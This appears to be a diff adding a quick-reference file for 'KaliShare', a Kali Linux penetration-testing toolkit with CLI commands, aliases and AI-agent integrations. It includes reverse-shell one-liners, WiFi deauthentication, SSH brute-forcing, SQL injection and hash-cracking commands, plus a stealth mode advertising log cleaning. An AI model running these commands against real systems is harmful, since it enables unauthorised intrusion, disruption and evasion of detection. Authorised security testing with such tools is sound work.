@@ -1,0 +1,358 @@
+# ═══════════════════════════════════════════════════════════════
+# KALISHARE COMPLETE OVERVIEW & QUICK REFERENCE
+# ═══════════════════════════════════════════════════════════════
+
+## PROJECT STRUCTURE
+
+```
+KaliShare/
+├── cli/                        # Command interface
+│   ├── go                      # Main CLI (50+ commands)
+│   ├── kali-ctl                # Kali control
+│   ├── net-scan                # Network scanning
+│   └── wifi-mon                # WiFi monitoring
+├── scripts/                    # 75+ automation scripts
+│   ├── tool-widget.sh          # Interactive TUI launcher
+│   ├── essential-tools.sh      # Install must-have tools
+│   ├── stealth-mode.sh         # OPSEC-safe operations
+│   ├── detection-tracker.sh    # Track security events
+│   ├── payload-generator.sh    # Generate shells/payloads
+│   ├── area-sweeper.sh         # Auto WiFi/network sweep
+│   ├── automation-hub.sh      # Workflow orchestration
+│   ├── skeleton-key/           # Windows password reset
+│   ├── setup-desktop-org.sh    # Desktop organization
+│   └── *.sh                    # Specialized scripts
+├── skills/                     # 32 AI skills
+├── docs/                       # Documentation
+├── chains/                    # Workflow chains
+├── mcp/                       # MCP servers
+├── agents/                    # AI agents
+├── gems/                      # Quick reference
+├── aliases.sh                 # Shell aliases (80+)
+├── README.md                  # Main documentation
+└── AGENTS.md                  # AI agent guidelines
+```
+
+## ═══════════════════════════════════════════════════════════════
+# QUICK START
+# ═══════════════════════════════════════════════════════════════
+
+# On Kali Linux
+cd /root/KaliShare
+
+# Main commands
+./cli/go help                  # Show all commands
+./cli/go quick 192.168.1.1     # Quick scan
+./cli/go wifi-menu            # WiFi tools
+./cli/go widget               # Interactive menu
+./cli/go essential            # Install tools
+./cli/go stealth              # Stealth mode
+
+# Alternative quick commands
+ks scan 192.168.1.1           # Quick scan
+ks wifi                       # WiFi menu
+ks widget                     # Tool widget
+
+# Load aliases
+source /root/KaliShare/aliases.sh
+
+# Tool widget (interactive)
+sudo ./scripts/tool-widget.sh
+
+# Terminal profile
+source /root/.bashrc_kalishare
+kshelp                        # Show help
+
+## ═══════════════════════════════════════════════════════════════
+# GO COMMAND REFERENCE
+# ═══════════════════════════════════════════════════════════════
+
+## NETWORK
+go pentest <target>     Full AI pentest (HexStrike)
+go full <target>        Full manual pentest
+go quick <target>      Quick scan
+go web <target>        Web app test
+go exploit <target>    Exploitation
+go stealth <target>   Low-profile scan
+go auto <target>      Fully automatic
+go recon              Install recon tools
+
+## WIFI
+go wifi               Basic WiFi audit
+go wifi-menu          Full WiFi tools menu
+go wifyte            Run Wifyte
+go fluxion           Run Fluxion
+go wpa <bssid>       Capture WPA handshake
+go deauth <bssid>    Deauth attack
+go crack <handshake> Crack handshake
+
+## TOOLS
+go widget             Tool widget (interactive)
+go essential          Essential tools installer
+go stealth            Stealth mode
+go detect             Detection tracker
+go payload            Payload generator
+go sweep              Area sweeper
+go automate           Automation hub
+go repos              Clone best repos
+go aliases            Load aliases
+go validate           Check tools
+go update             Update tools
+go status             Check systems
+
+## SETUP
+go home-lab           Setup complete home lab
+go boot-menu          Boot takeover menu
+go win-reset          Windows password reset
+go ai-install         Install AI tools
+go ai-pentest-tools   Install AI pentest frameworks
+go opencode           Install OpenCode plugins
+
+## HELP
+go help               Full help
+go quick-help         Quick reference
+
+## ═══════════════════════════════════════════════════════════════
+# QUICK ALIASES (load with: source aliases.sh)
+# ═══════════════════════════════════════════════════════════════
+
+# Network
+ns <target>           nmap -sn <target>
+nf <target>           nmap -sV -p- <target>
+nc                    netcat verbose
+mscan <target>        masscan fast scan
+
+# WiFi
+ws                    airodump-ng wlan0mon
+wm-start              airmon-ng start wlan0
+wm-stop               airmon-ng stop wlan0mon
+wf                    wifite
+
+# Web
+nk <url>              nikto -h <url>
+sm <url>              sqlmap -u <url> --batch
+gb <url>              gobuster dir -u <url>
+
+# Password
+hc                    hashcat
+jn                    john
+hyd                   hydra
+
+# Exploit
+msf                   msfconsole -q
+ss                    searchsploit
+
+# Quick
+ll                    ls -lah
+..                    cd ..
+~                     cd ~
+
+# KaliShare
+go                    Main CLI
+ksg                   Tool widget
+
+## ═══════════════════════════════════════════════════════════════
+# SCRIPTS DIRECT EXECUTION
+# ═══════════════════════════════════════════════════════════════
+
+# Interactive tools
+scripts/tool-widget.sh              # TUI launcher
+scripts/stealth-mode.sh             # Stealth ops
+scripts/detection-tracker.sh        # Track events
+scripts/automation-hub.sh           # Workflows
+
+# Sweepers & scanners
+scripts/area-sweeper.sh             # Auto WiFi/network sweep
+scripts/payload-generator.sh        # Generate payloads
+
+# Installers
+scripts/essential-tools.sh          # Install all tools
+scripts/setup-desktop-org.sh        # Desktop organization
+
+# Recovery
+scripts/boot-takeover-tools.sh      # Boot menu
+scripts/skeleton-key/               # Windows password reset
+
+## ═══════════════════════════════════════════════════════════════
+# TOOL WIDGET MENU
+# ═══════════════════════════════════════════════════════════════
+
+# Run: ./scripts/tool-widget.sh
+
+# Categories:
+# 1. Network Scan     - Nmap, masscan, netdiscover
+# 2. WiFi Audit       - Aircrack, reaver, wifite
+# 3. Web Testing      - Nikto, sqlmap, gobuster
+# 4. Password Attack - Hashcat, john, hydra
+# 5. Exploitation     - Metasploit, searchsploit
+# 6. Reconnaissance   - Whois, dnsenum, theHarvester
+# 7. AI Tools         - HexStrike, OpenCode, Ollama
+# 8. System Info      - Hardware, network status
+# 9. Recovery         - Boot tools, password reset
+# 0. Quick Commands   - Common one-liners
+
+## ═══════════════════════════════════════════════════════════════
+# ESSENTIAL ONE-LINERS
+# ═══════════════════════════════════════════════════════════════
+
+# Network discovery
+nmap -sn 192.168.1.0/24                    # Find live hosts
+nmap -sV -p- 192.168.1.1                   # Full port scan
+masscan -p1-65535 10.0.0.1 --rate=10000    # Fast scan
+
+# WiFi
+airmon-ng start wlan0                      # Monitor mode
+airodump-ng wlan0mon                       # Scan networks
+aireplay-ng --deauth 50 -a BSSID wlan0mon  # Deauth
+
+# Web
+nikto -h http://target                      # Vuln scan
+sqlmap -u "http://target" --batch          # SQLi
+gobuster dir -u http://target -w wordlist  # Directory
+
+# Password
+hashcat -m 0 hash.txt wordlist.txt         # MD5 crack
+hydra -L users.txt -P pass.txt target ssh  # SSH brute
+
+# Reverse shell
+nc -e /bin/bash 192.168.1.100 4444
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+## ═══════════════════════════════════════════════════════════════
+# AI TOOLS INTEGRATION
+# ═══════════════════════════════════════════════════════════════
+
+# OpenCode (AI coding agent)
+opencode                              # Start session
+
+# Ollama (Local LLM)
+ollama serve                          # Start server
+ollama run llama2                     # Run model
+
+# HexStrike (AI Pentest)
+cd /root/hexstrike-ai
+./hexstrike_mcp.py --ai --pentest --target <IP>
+
+# Claude Code
+claude                                 # Start CLI
+claude -p <project>                   # Project mode
+
+# Gemini CLI
+gemini                                # Start session
+
+## ═══════════════════════════════════════════════════════════════
+# FEATURES
+# ═══════════════════════════════════════════════════════════════
+
+# ✅ Stealth Mode
+#    - Tor routing
+#    - MAC spoofing
+#    - Log cleaning
+#    - DNS protection
+#    run: go stealth
+
+# ✅ Detection Tracker
+#    - Log IDS/IPS alerts
+#    - Track WAF blocks
+#    - Statistics & reporting
+#    run: go detect
+
+# ✅ Area Sweeper
+#    - Auto WiFi discovery
+#    - Handshake capture
+#    - Password cracking
+#    - Network scanning
+#    run: go sweep
+
+# ✅ Payload Generator
+#    - Reverse shells
+#    - Bind shells
+#    - Webshells
+#    - Macros, HTA
+#    run: go payload
+
+# ✅ Automation Hub
+#    - Recon workflow
+#    - Web test workflow
+#    - WiFi audit workflow
+#    - Exploit workflow
+#    run: go automate
+
+## ═══════════════════════════════════════════════════════════════
+# CUSTOMIZATION
+# ═══════════════════════════════════════════════════════════════
+
+# Desktop icons
+scripts/setup-desktop-org.sh         # Creates desktop icons
+
+# Terminal profile
+source /root/.bashrc_kalishare         # Enhanced bashrc
+
+# Quick launcher
+ks scan 192.168.1.1                   # Alternative to go
+
+# Predictive text
+# Loaded via /etc/profile.d/kalishare-suggestions.sh
+
+# Auto-complete
+# Nmap, Hydra, Go command completion installed
+
+## ═══════════════════════════════════════════════════════════════
+# TIPS & TRICKS
+# ═══════════════════════════════════════════════════════════════
+
+# Run as root (most pentest tools require it)
+sudo -s
+
+# Always validate tools before engagement
+./cli/go validate
+
+# Use widget for interactive tool selection
+./cli/go widget
+
+# Enable stealth for sensitive operations
+./cli/go stealth
+
+# Check status before starting
+./cli/go status
+
+# Backup config before changes
+tar -czf config-backup.tar.gz ~/.bashrc ~/.zshrc
+
+## ═══════════════════════════════════════════════════════════════
+# DOCS LOCATION
+# ═══════════════════════════════════════════════════════════════
+
+# docs/01_GETTING_STARTED/
+#   - OPENCODE-MCP-SETUP.txt
+#   - CLI-MCP-GUIDE.txt
+#   - BOOT-SETUP.txt
+
+# docs/02_TOOLS/
+#   - AI-ASSISTANTS.txt
+
+# docs/05_TIPS/
+#   - ALIASES-SHORTCUTS.txt
+#   - THEMES-CUSTOMIZATION.txt
+#   - CUSTOM-WIDGETS.txt
+
+# docs/06_REFERENCE/
+#   - TOOLS-HUB.txt
+#   - VETERAN-TOOLKIT.txt
+#   - BEST-REPOS.txt
+#   - REPOS-TO-CLONE.txt
+
+## ═══════════════════════════════════════════════════════════════
+# SUPPORT
+# ═══════════════════════════════════════════════════════════════
+
+# For help: ./cli/go help
+# Quick ref: ./cli/go quick-help
+# Status: ./cli/go status
+# Validate: ./cli/go validate
+
+# View all scripts: ls scripts/
+# View all skills: ls skills/
+# View all docs: ls docs/
+
+# ═══════════════════════════════════════════════════════════════
